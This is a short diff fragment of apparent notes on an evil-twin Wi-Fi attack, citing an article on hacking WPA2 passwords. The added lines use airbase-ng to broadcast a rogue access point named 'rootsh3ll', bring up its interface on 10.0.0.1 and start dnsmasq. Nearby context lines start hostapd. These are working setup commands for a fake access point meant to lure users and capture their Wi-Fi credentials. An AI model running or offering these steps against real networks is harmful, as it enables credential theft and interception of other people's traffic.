@@ -142,6 +142,11 @@ https://www.thecybersploit.com/2019/12/Hacking-WPA2-Wi-Fi-password-using-Evil-Tw
  sudo rfkill unblock wifi
 
   rfkill list
+airbase-ng  -e "rootsh3ll" -c 1 wlan1mon
+ifconfig at0 10.0.0.1 up 
+ifconfig at0 10.0.0.1/24 up 
+
+dnsmasq -C dnsmasq.conf -d
 
 
 sudo systemctl start hostapd
